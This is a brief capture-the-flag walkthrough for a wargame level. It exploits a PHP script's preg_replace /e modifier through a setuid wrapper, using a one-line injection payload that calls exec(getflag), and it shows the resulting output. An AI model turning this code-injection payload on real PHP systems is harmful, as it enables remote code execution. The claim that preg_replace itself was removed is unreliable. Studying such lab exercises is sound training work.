in the ~/ we got 2 files: 
- binary level06 (name of file to open and send to php)
- level06.php

The preg_replace() function in PHP was deprecated in PHP 5.5 and removed entirely in PHP 7.0. 
Due to its /e modifier transforms a simple string replacement function into a remote code execution (RCE) vulnerability.

```bash
echo '[x ${(exec(getflag))}]' > /tmp/p
./level06 /tmp/p
```

PHP Notice:  Undefined variable: Check flag.Here is your token : in /home/user/level06/level06.php(4) : regexp code on line 1